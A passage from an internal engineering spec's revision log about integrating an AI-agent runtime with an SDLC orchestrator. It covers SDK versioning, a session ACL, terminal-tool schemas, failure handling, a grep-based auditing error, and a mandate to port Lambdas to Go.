2. **A 30-second budget, not overridable.** `TOOL_METADATA.useMcpTool` is `{timeoutMs: 30_000, timeoutExempt: false}`, keyed on the **dispatcher** name, and the engine's `withTimeout` resolves a `toolError` at the deadline **without cancelling the work**. **This is why `reportCompletion` verifies instead of pushing** (§A.5.1).
3. **All three share one approval identity** (`useMcpTool`), so an approval UI could not tell them apart. Harmless for unattended sessions, which approve everything.

**(b) Target version: 4.0.1, unchanged. There is no 4.0.2.** The earlier answer prescribed patching 4.0.1 and publishing 4.0.2, and rejected HEAD. With the seam found, **neither option is needed**: `nevado-sherpa-tui`'s `pnpm-lock.yaml` resolves `@nevadoai/sherpa-core` and `@nevadoai/sherpa-protocol` to **`4.0.1`** against a `^4.0.1` specifier, and that is what shipped.

The one release that *did* happen is not a dependency: `sherpa-sdk` #227/#228 widened `SessionApplication` to `'ide' | 'tui' | 'web' | 'sdlc'`, and **nothing consumes it.** The runtime casts at its single `manager.create` call site instead — a compile-time accommodation, not a behavioural one, because the value is already settable at runtime (§0.1.d(2)).

**The release-cost argument that drove the old answer is still true and still worth having** — it is what §A.5.0 rests on, and the reason the allowlist bounds are pinned by a driftguard rather than left to review. The choreography for any change that *does* need the SDK remains: edit `sherpa-sdk` → tag and publish `@nevadoai/sherpa-core` → bump `apps/runtime/package.json` and `pnpm-lock.yaml` → build → deploy by manual SSM RunCommand, which stops the service, `rm -rf`s `/opt/sherpa`, and loses every in-flight session. There is no shortcut: root `package.json`'s `pnpm.overrides` covers only `brace-expansion` and `esbuild`, and CI runs `pnpm install --frozen-lockfile`, so a local link will not survive. **The seam's value is that a terminal-tool change no longer pays that bill** — it is a runtime deploy, which is still an outage window, but one repo and one artifact rather than three.

**On the 64-commit HEAD bump:** unchanged advice, and now fully decoupled. Do it as its own release, verified against human sessions, on the runtime owner's schedule. Every `engine/tools/*` and `tool-context.ts` path cited in §0.1.c is a HEAD path; when you open the deployed 4.0.1 and the line number is wrong by hundreds, that is why (§0.1.b C29).

##### BQ3a — the SDK change that WAS authorised, and why it was declined anyway

Recorded here because "we could not change the SDK" would be the wrong lesson to draw. **An SDK change was explicitly authorised, opened as `sherpa-sdk` #226 — "default `createdBy` and `application` on session create instead of forcing them" — and CLOSED unmerged, on merit.** BQ4 part 2 below specified exactly that change; it is struck there.

There is a second, larger change nobody opened, and the reasoning is the more useful of the two because it generalises. The tempting fix for the SDLC path's missing failure edge is to make the engine emit `'completed'` on a healthy exit, so a consumer can read outcome off `sessionStatus`. **Do not.** Three reasons, in ascending order of how much they settle:

1. **`'completed'` is a human complete/archive flag, not an outcome flag.** `SessionManager.completeSession` still exists and the IDE's explicit archive still calls it, so a session *can* reach `'completed'` — just never by running to the end of a turn.
2. **Emitting it from the engine loop would break `nevado-sherpa-ide`.** Its `/resume` enumerates resumable sessions with `listByStatus('paused')` and would stop seeing them.
3. **The one that ends the conversation: no session status can distinguish a session that finished having submitted a result from one that finished having submitted nothing.** They are in the *same lifecycle state*. **Delivery is not a lifecycle state.** So a later SDK growing a `'completed'` status is not an invitation to restore anything — it changes nothing about what a status can mean.

Outcome therefore reaches Command Center as a published `completion` event and is **never inferred from a status**. The source of record for this argument is `command-center/backend/go/internal/orchestrator/runtimeevents/runtimeevents.go` (package docblock), which also records that Command Center **deleted** its `sessionStatus === 'completed'` arm (#815) on the strength of it, and `backend/go/internal/orchestrator/sdlcevent/contract.go`, which records "THERE IS NO `SessionStatusCompleted`, and its absence is deliberate".

**Both halves are pinned executably, not by comment.** `nevado-sherpa-tui`'s `apps/runtime/src/sdlc/contract.driftguard.test.ts` extracts the status argument of every `finish` call site out of the **installed** `@nevadoai/sherpa-core` bundle and asserts there are **exactly ten** and that the status set is exactly `{paused}`. The count is pinned so the probe cannot pass vacuously — a rename, a re-bundle or a moved file reads as zero sites, never as a pass. A type-level pin was not available: `RunTurnResult.status` is the full `AgentSession['status']` union, `finish` is private so its `'paused' | 'completed'` parameter is off the public surface, and `PauseReason` actually *lists* `completed`.

#### BQ4 — ~~How does the runtime get a real caller identity?~~ **RESOLVED: v1 needs no SDK change at all.**

The earlier draft recommended constructing a `SessionManager` per request with `userId: "m2m:<client_id>"`. **That does not work**, for three verified reasons:

- **`AgentWorker` holds the manager, not the route.** `apps/runtime/src/index.ts:80` is `new AgentWorker(config, manager, broadcaster, credentials, settingsStore)`, taking the single module-scope manager built at `:59-69`. Every `save`, `appendMessages` and terminal transition for the life of a session runs through *that* manager. A per-request manager would stamp `createdBy` at create time and then never be used again.
- **Per-request construction destroys the only two guards the SDK has.** `SessionManager` owns `editLock` (a `KeyedMutex` serialising delete / import / transition per session id) and `activeRuns: Map<string, AgentSession>`, which is what makes the terminal-transition resurrection guard work. Both are **per-manager and in-memory**. A second manager per request means an empty lock table and an empty run registry — widening the exact race Task 2.5 exists to close.
- **Revision 6 correction.** An earlier revision dismissed the objection to changing the SDK — *"it loosens an invariant the SDK asserts deliberately"* — on the grounds that `this.userId` is the literal `'dev-user'` (`index.ts:61`) and nothing validates it. **That dismissal was wrong, and part 2 of the decision below is struck because of it.** The invariant is not a placeholder: `createdBy` is *read* as an authorization gate by `renameSession`, so it is a control, in the human surface, today. Reaching for a per-request manager is still the wrong move for the two reasons above — but "the SDK's forcing is vacuous" is not one of the reasons.

**And the important finding, which reduces this from a blocking question to a non-event:** the review concluded that both invisibility keys are forced and that a two-line SDK change is a prerequisite. **`application` is not forced in practice.** `session-manager.ts:768` is `...(this.application ? { application: this.application } : {})` — a **conditional** spread — and the runtime constructs its `SessionManager` **without** an `application` (`apps/runtime/src/index.ts:59-69`: `store`, `userId`, `publish`, `agentId: 'web'`, `remoteList`, `settle`, and nothing else). So `this.application` is `undefined`, the spread contributes `{}`, and **`options.application` from the caller spread at `:749` survives.**

`createdBy` is genuinely forced — `:759` is unconditional — but v1's ACL does not need it.

**Decision, in three parts:**

1. **v1's ACL enforces `application === 'sdlc'` and nothing else.** That is the whole of its real security value: a machine caller cannot read a human transcript, and a human cannot resume an SDLC session. **It requires no SDK change and no per-request manager.**
2. ~~**Unforce `createdBy` and `application` in 4.0.2 anyway**~~ — **STRUCK (revision 6). This was authorised, opened as `sherpa-sdk` #226, and CLOSED unmerged. The forcing is correct and stays.** The decisive fact the "two lines, zero marginal cost" framing missed: **`createdBy` is not an inert label — it backs a live ownership check.** `SessionManager.renameSession` throws `RemoteSessionNotOwnedError` when `record.createdBy !== this.userId`, and `isSessionRenamable` (`@nevadoai/sherpa-protocol`) refuses a remote-only session the same way; both fail **open** when the field is absent and **closed** when it disagrees. So letting a caller supply `createdBy` lets a caller assert ownership of a session it does not own, and — on this runtime, whose manager is `userId: 'dev-user'` — persisting `m2m:…` would make that comparison true and render **every SDLC session un-renameable**, trading a live human capability for a label. See §A.3 for what that rules out permanently.
3. **Assert `application` persistence in a test, because the hazard in (2)'s original rationale is real even though the fix is not.** `application` survives the forced block only *because* this runtime's manager has no `application` of its own; anyone who later passes `application: 'web'` to that constructor silently starts overriding `'sdlc'` and **quietly disables the entire ACL**, with no build failure. Task 2.2's test list therefore asserts that a created SDLC session **persists** `application === 'sdlc'` — read back off the record, not off the create argument or the response body. That assertion is the only thing standing between a one-word constructor change and a silently open ACL.

This deletes the old Task 2.0 as a blocking investigation (it is now struck outright — see Phase 2) and reduces Task 2.4's ACL to a `preHandler` with one predicate.

---

### 0.5 What changed after the architecture review, and where I disagree with it

The principal architect's review (`sdlc-runtime-impl-spec-architecture-review.md`, 2026-09-23) re-verified the load-bearing claims in §0.1 and confirmed all of them. Its findings against this document are applied. This subsection is the delta, so a reader who saw an earlier draft knows what moved and why, and so the two places I am not complying are visible rather than buried.

**Applied, with the section that changed:**

| # | Finding | Change |
|---|---|---|
| 1 | Task 0.5's R0 fix was broken — `cycle?.progressLog \|\| cycle?.activities` never reaches the fallback, because the cycle record initialises `progressLog: []` (`index.js:1096`) and `[]` is truthy. The commit that existed to stop the runtime feed going blank would have blanked the **legacy** feed instead, on every un-migrated application, for the whole migration. And every test in that task was a source-text regex over field names, so none would have caught it. | Task 0.5 rewritten: a shared pure `selectActivities(cycle)` that **merges both arrays and sorts on timestamp**, in `backend/common/cycleActivities.js`, imported by the frontend through the existing vite alias mechanism and unit-tested behaviourally in backend jest with four fixtures. Also fixes a **second instance of the same bug in the backend** that the review did not find — see §0.1.d(3). |
| 2 | Release-before-create rests on a false premise: the runtime provisions independent shallow clones, not worktrees, so git does not refuse the same branch twice and §A.2.1's `409` is unreachable. | Reversed to **create-then-release**. The `409` row is deleted from §A.2.1. Phase 2 exit criterion 5 rewritten — it previously asserted `201, not 409`, which passes trivially. §A.2.4 and the DEP-P1-1 answer updated. |
| 3 | BQ4's recommended answer does not work and would widen the race Task 2.5 closes. | BQ4 rewritten above. v1's ACL is `application === 'sdlc'` only, and it needs **no** SDK change — see the finding in §0.1.d(2) that reduces the review's two-line prerequisite to an optional free rider. |
| 4 | Plan and review completions are silently discarded between Phase 3 and Phases 5–6, because `applyRuntimeEffect`'s default arm is `console.warn` and the SQS message is then deleted. | `applyRuntimeEffect`'s default arm **throws** (Task 3.3), making the whole effect vocabulary fail-closed under at-least-once delivery. Task 3.2 builds all three mapper arms and an unrecognised `kind` fails loudly to the DLQ. The split with Part 2 is stated explicitly in Task 3.2. |
| 5 | Phase 2 never builds `GET /sessions/{id}` or `POST /sessions/{id}/cancel`, yet its exit criterion, the CC client and the ACL tests all depend on them. | New **Task 2.2b**. |
| 6 | The terminal-tool schemas put CC's plan and QA schemas inside the runtime's protocol package *and* its tool specs, and every schema iteration then costs a cross-repo release plus an outage. | **Partly superseded by revision 3 — see §0.6.** The diagnosis was right; revision 2's fix (collapse to one `submitResult`) over-corrected and cost the stage discriminator. Revision 3 keeps three tool names, types the plan and review payloads `unknown`, and adds `resultSchema` for in-session enforcement. §A.4.3, §A.5, §A.7.3, §A.8, §A.8a, §A.9 and the DEP-P1-9 answer all change again. |
| — | §2.2: `correlation.stage` as a closed union the runtime validates is the same leak with the same bill, and contradicts this document's own *"the runtime is a courier"* assertions. | `correlation.stage` is typed `string` in the protocol. The runtime validates only that `correlation` is a flat object of non-empty strings under a size bound. The stage-value check moves to the consumer, where `validateEnvelope` already does it. §A.2.1 changed, one Task 2.2 test deleted. |
| — | Decisions: `seq` → per-envelope UUID; ~~SDK 4.0.2 not HEAD~~ (**struck in revision 6 — no SDK release at all; BQ3**); `DELETE` returns `200`; the stray `201`/`202` contradiction. | BQ2, BQ3 above; §A.2.1, §A.2.4, §A.4.1, §A.4.5, Tasks 3.1/3.9, Phase 3 exit criteria. |
| — | §5.1–5.2 fitness notes: Task 3.3 is secretly multi-day; Task 2.2 hands the extract-or-copy decision to the implementer; Task 2.5 leaves two decisions open; Task 3.10's coalescing assertion fails on correct behaviour; `SdlcSessionProfile` has six fields expressing two facts; `?include=session` is a nice-to-have with a normative row. | Task 3.3 split into **three PRs**. Task 2.2 says **extract**. Task 2.5 states both decisions. Task 3.10 criterion 1 asserts on the transport, not the record. `SdlcSessionProfile` trimmed to `{tools, maxTurns}`. `?include=session` demoted to a follow-up note. |

**Round 2 — reconciled with Part 2's revision.** Part 2 raised four items against this document after its own revision. Three are accepted and one is a confirmed correction to a line number I had wrong.

| # | Part 2's point | Outcome |
|---|---|---|
| a | **The extraction end boundary is `:1943`, not `:1945`.** `:1944` opens `catch (condErr)` and `:1948`'s `continue` belongs to the `for (const record of event.Records)` loop at `:1692`. | **Confirmed — Part 2 is right and I was wrong.** Verified: `:1936` opens `try`, `:1943` is `}));` closing the `PutCommand` call, `:1944` opens the `catch`, `:1947` pushes onto `processSQSCycleExecution`'s local `results` array (declared `:1689`), `:1948` is `continue`. My `:1945` would have split the `catch` mid-clause — a syntax error — and moving the block whole would move `continue` out of its loop, which is also a syntax error rather than a runtime bug. **The start remains `:1839`.** See the note in Task 3.3 and the `DEP-P1-8` answer for the two coherent ways to end it. |
| b | **A failed `checkoutCommit` must become a create-time `400`** (`DEP-P1-10`), because Phase 6 has no safe fallback beyond backup checks. | **Accepted, and it was already Task 2.3's sub-problem (b)** — now promoted to a named dependency answer and strengthened in §A.2.1's `commitSha` row so it cannot be read as optional hardening. |
| c | **Phase 3's `completion` arm should handle `engineering` only**, with the `default` arm throwing (`DEP-P1-11`). | **Accepted, and it supersedes an earlier instruction in this document to build all three mapper arms.** The reason is a cleaner ownership line: Part 2 owns the `planComplete`/`qaComplete` effect shapes (its Tasks 5.1 and 6.5), so Part 1 emitting them first would pin a contract Part 2 has not designed. **Part 1's job is to make the gap loud, not to guess the shape.** Task 3.2 now rejects `plan`/`review` with a named unsupported-stage failure; the `default`-arm throw (Task 3.3 PR (b)) is what makes any future gap loud too. |
| d | **A malformed payload must NOT throw** — it is an ordinary model failure, not a protocol violation, and throwing burns ~9 minutes of a frozen `messageGroupId` to reach a conclusion the first attempt already had. | **Accepted, and it is the better answer.** This is a real tension with finding 4 above, which made the effect vocabulary fail-closed. The resolution is a principle rather than a case list, because an implementer will otherwise collapse the two: **new §A.4.6 — "Failure disposition"**. A failure that a redrive after a code deploy would fix goes to the DLQ; a deterministic model failure that a human must act on becomes a terminal cycle status and the message is consumed. §A.4.6, Task 3.2 and Task 3.5 all draw that line explicitly. |

**Two places the review is itself wrong. Neither changes a decision; both change what an implementer would otherwise be told.**

1. **The review says the runtime's real concurrency cap is 11, not 10** (*"the capacity gate is `>` not `>=` … so the real cap is 11 concurrent. Immaterial, but R4's arithmetic is off by one"*). It is 10, and the off-by-one is in the review. `worker.ts:127` does `this.activeSessions.set(session.id, abort)` **before** the gate at `:134`, so a parked starter is already counted, and the code comment at `:130-133` says exactly why the comparison is `>`: *"Capacity gate runs AFTER reserving, so a queued starter is already counted in activeSessions — hence `>` (not `>=`) to keep the original admission of exactly maxConcurrentSessions running at once."* With `max = 10`, the tenth session sets `size = 10`, `10 > 10` is false, and it runs; the eleventh sets `size = 11`, parks. Exactly ten run. R4's arithmetic stands.
2. **The review's fix for the concurrency-slot half of Task 2.5 would be rejected by the code's own comment if taken literally.** The review is right that awaiting the unwind is the only workable fix; what it does not say is that the obvious alternative is explicitly forbidden. `worker.ts:244-246` reads: *"deliberately NOT that method's eager activeAborts delete: here the map is the liveness record behind isSessionActive and the capacity accounting, so startSession's `finally` must stay its only owner or a cancel would release a slot the unwinding turn still holds."* An implementer's first instinct is to delete the map entry in `cancelSession`; that would corrupt capacity accounting. Task 2.5 now cites this.

---

### 0.6 Revision 3 — the terminal-tool adjudication

An independent architect adjudicated the terminal-tool surface **cold**, with no knowledge of who proposed what and having deliberately not read the earlier reviews (`context/specs/terminal-tool-design-decision.md`). Its verdict: revision 1's three-typed-tool design was correctly rejected, **but for the wrong reason**, and revision 2's fix **gave up something it did not need to**. Both corrections are applied. This subsection is the delta.

**The fact none of us had, and it changes the argument entirely:**

> **`inputSchema` is never read at runtime.** It is assembled into Bedrock's `ToolConfiguration` (`bedrock-client.ts:163`) and never consulted again. **There is no schema validator in either repo** — zero hits for `ajv|zod|json-schema|jsonschema` across both `packages`/`apps` trees and all four `package.json` files. Every argument check is hand-rolled per field inside the dispatch switch.

Independently verified for this revision. Two consequences:

1. **The architecture doc's central claim for typed tools is false against the deployed code.** A declared `inputSchema` buys generation-time biasing from Bedrock and nothing else. It enforces nothing. So revision 1 would have had to hand-write CC's plan and QA vocabulary as imperative `if` statements inside `agent-engine.ts` to get the enforcement it promised.
2. **That arrangement is already broken in production, and worse than "drift".** `saveLearnedPattern` declares `{title, category, trigger, content}` with `required: ['title','category','content']`, but its handler hard-requires **`input.pattern`** — a property the schema **never declares at all** — while `content` is declared *required* and never read. **So the tool fails on every schema-compliant call; there is no input that succeeds.** `updateTechDebt` has the same class of defect (handler reads `severity`/`file`/`line` against declared `priority`/`category`/`location`). Both identical at `v4.0.1` and HEAD. Verified by enumerating handler reads against declared properties; see §A.5.0a.

**What changed, and why:**

| # | Change | Reason |
|---|---|---|
| 1 | **Three named tools restored: `reportCompletion`, `submitPlan`, `submitReview`.** `submitResult` is withdrawn. | Collapsing the *names* was never required to fix the real problem, and **it cost the stage discriminator.** With one tool, `planning` and `qa` both produced `kind: 'result'`, so the `kind` ↔ `correlation.stage` cross-check this document defends at length became **vacuous for exactly the two stages that need it** — a review payload mislabelled `stage: 'planning'` was undetectable at the boundary. §A.4.3. |
| 2 | **`submitPlan` and `submitReview` payloads stay `unknown`.** | This was the actual problem and it stays fixed. No `severity`, `acceptanceCriteria`, `requirementsMet` or any other CC business field appears in `protocol/src/sdlc.ts` or `tool-specs.ts`. |
| 3 | **`reportCompletion` stays fully typed.** | Branch, commit sha, files changed are git and session vocabulary — legitimately the runtime's — and they drive behaviour *inside* the tool. §A.5.1. |
| 4 | **New optional create field `resultSchema`** — an opaque JSON Schema authored by CC, stored beside `correlation`, run **generically** over the payload before publishing. | **This is the in-session enforcement revision 2 gave up, recovered without CC's vocabulary entering the runtime.** §A.5.3. Needs a validator; **neither repo has one**, and the spec says hand-roll a bounded subset rather than add `ajv`. |
| 5 | **A validation failure is a `toolError`**, so the agent corrects and retries inside the same turn. | Verified that `toolError` really produces in-turn correction: `status: 'error'` (`agent-engine.ts:231`) appended to `messages` (`:729-731`), turn loop continues (`:472`). |
| 6 | **`resultSchema` is optional; absent means forward unvalidated.** | So the validator can be **turned off by a CC-side config change with no runtime deploy** — which is what makes it safe to ship a validator behind an outage-gated release. §A.5.3. |
| 7 | ~~**It rides the 4.0.2 release Task 2.1 already cuts.**~~ **Revision 6: it rides the one RUNTIME deploy Task 2.1 already needs** — there is no SDK release (BQ3). | Marginal cost: **zero deploy windows.** Deferring it costs one. The argument is unchanged; only the repo is. |
| 8 | **The oversize gate checks both bounds.** | 256 KB was SQS's limit; **the binding constraint is the 400 KB DynamoDB item**, shared with `progressLog`, `iterations` and `activities`. There was a band of payloads the runtime forwarded happily and CC could not persist. §A.4.3. |
| 9 | **The headline rationale is now operational, not architectural.** | §A.5.0 leads with: no deploy pipeline, no drain, no observable version (mutable `latest.txt`), demonstrated drift. **The §1.1 boundary argument was weaker than two revisions presented it** — the runtime already knows "plan" as a first-class concept (`SessionCommand`, `writePlan`, `PLAN_BLOCKED_TOOLS`, `planCreated`, `AgentSession.plan`), and `instructions` crosses the same boundary with far more SDLC content. |
| 10 | **Payload validation has one CC-side home: the consumer.** | The mapper stays pure (Task 3.2). |
| 11 | **The terminal tool is not terminal.** | The engine loops until `end_turn`, so a model can call a terminal tool twice with different payloads and the consumer's `ConditionExpression` silently discards the second. First-write-wins was **accidental**; §A.5.4a makes it deliberate by rejecting the second call in-session. This matters *more* under (4), since retry-after-`toolError` makes multiple calls normal. |
| 12 | **The plan schema's required set was derived from a dialog the memo believed was dead.** | **Half right, and the half that was wrong I got wrong too — see §0.7.** The memo is right that `PlanReview.jsx` is a live plan-review surface that no earlier revision accounted for, and right that it reads a `plan.tasks` alias, `requirements[].dependencies` and `cycle.planVersion`. It is **wrong** that `ApplicationDetail.jsx`'s dialog is unreachable, and I repeated the error: **there is a fifth `setPlanningReviewData` site that passes the setter as a prop** (`:618`, `onReviewPlan={setPlanningReviewData}`), invisible to a grep for `setPlanningReviewData(`. **There are two live surfaces.** §A.8a derives the required set from both; **Task 0.6 makes the original one-word field fix and adds a guard pinning the wiring** — it does not delete anything. |
| 13 | **`PLAN_PAYLOAD_CONTRACT` added** alongside `QA_PAYLOAD_CONTRACT`. | The plan half previously shared nothing between prose and validator while the QA half did — **so the plan schema, the one a human approves, was the half where prompt and validator could silently diverge.** That is the same defect class the runtime already exhibits. §A.8a. |
| — | Three residuals from the conformance pass. | A stale `stage`-value `400` row contradicting this document's own test (fixed, §A.2.1); a duplicated §A.3 preamble left behind by the ACL rewrite (deleted); and `payload: {type: 'object'}` versus prose saying "object or array" (**resolved to object-only** — it matches the declaration, and both real payloads are objects, so a top-level array buys nothing and makes the consumer's dispatch ambiguous). |

**One place I part company with the adjudication, on a small point of fact.** It says of `approach`: *"the only reader is the unrelated `cursorAgent` path."* There is a fourth reader it missed — `backend/lambda_handlers/integrationAgent/orchestratorHandler.js:112` — and, more importantly, one of the cursor readers is load-bearing: `cursorAgent/devHandler.js:98` is `requirements: plan?.approach || task`, so for an application with `devAgent: 'cursor'` the plan's `approach` becomes **the dev agent's entire requirements input.** So the conclusion holds — `approach` must not be *required* on the grounds that a dialog renders it — but the stronger version ("no live readers") does not, and `approach` must keep being **emitted**. §A.8a records both.

**What did not change, and should not:** §A.4.6's failure-disposition rules are verbatim. The adjudication agrees they are correct independent of this decision, and `resultSchema` only makes the "terminal cycle status" row fire rarely instead of routinely.

---

### 0.7 Revision 4 — a correction to revision 3, and the audit method that caused it

**Revision 3 got one finding wrong and it would have deleted working code.** Recording it in full, because the mistake is mechanical and reusable, and because the corrected task is now contingent on an uncommitted diff that someone will later rebase.

#### What happened

The terminal-tool adjudication (§0.6, finding 12) reported that `ApplicationDetail.jsx`'s plan-review dialog is unreachable dead code. **I verified it independently, reached the same conclusion, and rewrote Task 0.6 from a one-word field fix into a deletion.** Part 2, auditing the same code, concluded the opposite. Part 2 is right.

**The flawed step, precisely:** the reachability check was `grep -n "setPlanningReviewData(" …` — with an **opening paren**. That finds *invocations*. It cannot find a setter **handed to a child component as a prop**, because a bare reference has no paren. Dropping the paren reveals a fifth site:

```
ApplicationDetail.jsx:618   onReviewPlan={setPlanningReviewData}
```

`AttentionCard.jsx:25-26` then calls `onReviewPlan?.(cycle)` with a **non-null** cycle for both `approve_plan` and `review_plan`, and `cycleStatusConfig.js:38` makes `review-plan` the primary action on `PLANNING_REVIEW`. The chain is complete and the dialog renders.

**The lesson, generalised:** in React, a state setter reaching its call site as a prop is the normal case, not an exception. **A grep for `setX(` is not a reachability test for `setX`.** Grep for the bare identifier and read every hit, or trace the prop. This document's own §0.2 convention — source-parsing guard tests with an anti-vacuity assertion — exists for exactly this class of error; the anti-vacuity guard would not have helped here, but *following the prop* would have.

**A second contributing factor worth naming:** the dialog *was* dead until recently, and the wiring that revived it is **uncommitted** (`grep -c onReviewPlan` against `HEAD` returns **0** for both files). So a check against committed state would also have concluded "dead". Auditing a dirty tree requires being explicit about which state you are auditing — and this spec is written against the working tree (§0.1's verification note), so the working tree is the answer.

#### What changed back

| Item | Revision 3 | Revision 4 |
|---|---|---|
| **Task 0.6** | Delete `ApplicationDetail.jsx:1676-1800` and the `planningReviewData` state | **No delete.** Make the original two-occurrence `technicalApproach` → `approach` fix, and **add a guard test pinning `onReviewPlan={setPlanningReviewData}`** so a rebase that drops the uncommitted work fails a test instead of silently killing the panel |
| **Live plan-review surfaces** | One (`PlanReview.jsx`) | **Two** — `PlanReview.jsx` via `ActiveCycleHero.jsx:51-59`, and `ApplicationDetail.jsx`'s dialog via the attention card |
| **`approach` in the plan schema** | Demoted to optional ("no dialog renders it") | **Required again.** It now has a live renderer *and* the `devHandler.js:98` path where `requirements: plan?.approach \|\| task` makes it the Cursor dev agent's entire requirements input. §A.8a |
| **§A.8a's required set** | Derived from `PlanReview.jsx` + `recordCheckpoint` | Derived from **both dialogs** + `recordCheckpoint`, taking the **union** where they differ |

#### The contingency, and how it reverses

**Task 0.6's correctness depends on one line surviving:** `ApplicationDetail.jsx:618`. If the uncommitted frontend work is abandoned or rebased away, the dialog becomes genuinely unreachable and **the delete becomes the right call after all.**

Three things make that safe to live with:

1. **The dependency is one line, and a test pins it.** Task 0.6's `it('keeps the plan dialog reachable from the attention card')` fails loudly if either half of the wiring disappears.
2. **`approach`'s required status does not rest on it.** `devHandler.js:98` is committed and independent, so even if both dialogs vanished, `approach` stays required.
3. **Part 2 has written Tasks 5.3 and 4b.4 to reverse the same way.** Abandoning the attention-card route is then a coordinated two-document change rather than a hunt through prose.

#### What did not change

Everything else in revision 3 stands: three named terminal tools, `reportCompletion` typed, `submitPlan`/`submitReview` with `payload: unknown`, the optional `resultSchema` executed generically, the **hand-rolled** bounded-subset validator with **no `ajv`** and **`pattern` excluded as a ReDoS vector**, the `maxLength`/`maxItems` DynamoDB budget travelling inside `resultSchema`, the double-submit guard, §A.8a's shared contracts, and §A.4.6's disposition rules verbatim.

**Also unchanged: the live `PlanReview.jsx:19-20` crash.** `const tasks = plan?.requirements || plan?.tasks || []` followed immediately by `tasks.reduce(...)` throws if `requirements` is truthy-but-not-an-array, breaking the approval gate before render. A one-line `Array.isArray` fix, out of scope here, and the strongest concrete argument for `resultSchema`'s in-session validation — it converts a broken gate into a `toolError` the model corrects in the same turn.

---

### 0.8 Revision 5 — the Go mandate, and the shape it forces

**Constraint, not a preference: all Command Center Lambdas must be written in Go. It is a CTO mandate and it is not weighed against cost.**

**This overturns a settled input of the architecture doc.** Its decision 2 — *"TypeScript in the existing JS orchestrator rather than a new Go executor"* — is no longer available, and its §5.5 (*"what TypeScript-not-Go costs"*) now describes a path that does not exist. Do not implement against either.

**Record it in `CLAUDE.md`.** The rule is written nowhere — not in `CLAUDE.md`, not in `docs/`, not in the migration plan's own text. It was transmitted verbally. A constraint that strong, discoverable only by being told, will be violated by the next person. **That documentation change is Task 0.10.**

#### 0.8.1 The one fact that decides the shape

Before choosing anything, this:

| JS artifact | Production call sites | Evidence |
|---|---|---|
| `runtimeEvents.js` — `mapSessionEvent`, `buildCompletionEffect` | **ZERO** | `require`d at `index.js:42`; every other mention is docblock prose (`:130`, `:134`). **Never invoked.** |
| `applyRuntimeEffect` | **ZERO** | defined `index.js:140`, exported `:4982`, mentioned in its own docblock `:135`. **No caller.** |
| `routeAfterEngineering` | **FIVE, all live** | `:1921`, `:2197`, `:2926`, `:3743`, and via `applyRuntimeEffect` (which nothing calls) |
| `writeStatus`, the `addProgressLog` wrapper, `extractOwnerRepo` | many | 52 `addProgressLog` sites alone |

`runtimeEvents.js` and `applyRuntimeEffect` shipped on `develop` in commits `546408af` and `5eafe042` **as a seam awaiting a consumer that was never built.** They are not load-bearing; they are scaffolding with tests.

**So the mandate does not force a risky migration here — it removes one.** An earlier revision's Task 3.3 extracted `applyRuntimeEffect`, `routeAfterEngineering`, `writeStatus` and the `addProgressLog` wrapper into `backend/common/cycleEffects.js` across three PRs, touching five live call sites and fifty-two progress-log sites with no feature flag, and this document called it *"the riskiest revert in Part 1."* **That extraction is cancelled.** Two reasons, and the second is independent of risk:

1. Its purpose was to let a *separate JS Lambda* import the logic. **A Go consumer cannot import JS**, so the extraction buys nothing.
2. **Wave 6 of the migration plan deletes `backend/common/` entirely** (*"Remove `backend/common/` directory"*, *"Remove common Lambda Layer from Terraform"*). Creating two new modules there — `cycleEffects.js` and `runtimeClient.js` — would be building into a condemned building.

#### 0.8.2 The candidate shapes, assessed

Constrained by `context/plans/go-migration-plan-for-node-js-lambda-handlers.md`, which is the governing document and which I follow rather than parallel.

| Shape | Verdict |
|---|---|
| **Fold the cycle path into the existing Go `sdlc-manager`** | **Reject.** `internal/sdlc` is SDLC *template* CRUD — 828 lines including tests, keyed on `sdlcTemplatesPK = "SDLC_TEMPLATES"` / `entityTypeSDLCTemplate = "sdlc_template"` (`internal/sdlc/handler.go:20-27`). It owns templates, not cycles, and it is an API-Gateway CRUD handler, whereas the consumer is SQS-triggered with a different lifecycle and IAM. Folding them conflates two things the migration plan deliberately separates — Wave 5 gives the orchestrator its own `internal/orchestrator/*` packages, not a corner of `internal/sdlc`. **But reuse its conventions**, and reuse its DynamoDB entity-type constants rather than restating them. |
| **A new Go handler for the cycle path, alongside** | **Take this.** It is what the migration plan's Wave-5 decomposition already prescribes (`internal/orchestrator/router.go`, `cycle.go`, `engineering.go`, `progress.go`, …). The consumer is **genuinely new code with nothing to port**, so it starts in Go carrying no migration debt, and it lands the `internal/orchestrator` package that Wave 5 then grows into rather than competing with it. |
| **Migrate `agentDrivenOrchestrator` wholesale as a prerequisite** | **Reject as a prerequisite; require as a successor.** The migration plan puts it at **Wave 5, last**, 2–3 weeks, explicitly *"defer the orchestrator (most complex, most critical) until patterns are proven"* and *"depends on patterns proven in Waves 1-4."* Making it a prerequisite inverts the plan's own risk ordering and blocks this work behind its single riskiest migration. Nothing in Phases 0–3 needs it. |

**Decision: a new Go SQS-consumer Lambda plus a new `internal/orchestrator` package, following Wave 5's decomposition and seeding it.**

#### 0.8.3 What happens to each JS artifact — ported, deleted, or dual-run

**Stated precisely, because "some of it stays JS" is how a half-migration starts.**

| Artifact | Fate | Why |
|---|---|---|
| `runtimeEvents.js` (`mapSessionEvent`, `buildCompletionEffect`) | **Ported to Go, JS DELETED** — `internal/orchestrator/runtimeevents/` | Zero callers (§0.8.1). No dual-run, no guard needed. Its JS tests (`backend/__tests__/runtimeEvents.test.js`, 122 lines) are **not** deleted first: they are the specification the Go port is written against, then removed with the JS. |
| `applyRuntimeEffect` + its export at `index.js:4982` | **Ported to Go, JS DELETED** — `internal/orchestrator/cycleeffects/` | Zero callers. `backend/__tests__/applyRuntimeEffect.test.js` goes with it. **Note this reverses an earlier revision's instruction to keep the export** ("the SQS path and the event path share one implementation") — they no longer can, and nothing was sharing it. |
| `routeAfterEngineering` | **Ported to Go for the consumer; JS stays untouched** | Five live callers on the legacy SQS path. **This is the one genuine dual implementation**, and it is time-boxed: Wave 5 deletes the JS copy. Guarded per §0.8.4. |
| `writeStatus`, `addProgressLog` wrapper, `extractOwnerRepo` | **Reimplemented in Go for the consumer; JS stays untouched** | Same reasoning. The Go versions use `internal/dynamo`'s generic Query/Put/Update (Wave 0, done) rather than porting the closure style. |
| `sdlcEngine.js` `applyTransition` + the `TRANSITIONS` table | **Ported to Go; JS stays until Wave 5** | The transition table is a contract, not an implementation — §0.8.4 makes it a shared data file so the two cannot diverge. |
| `runtimeDispatch.js` | **Phase 0's fixes stand as JS** (already merged, `5221cbb1`); **Phase 2 rewrites it in Go** | See §0.8.5. |

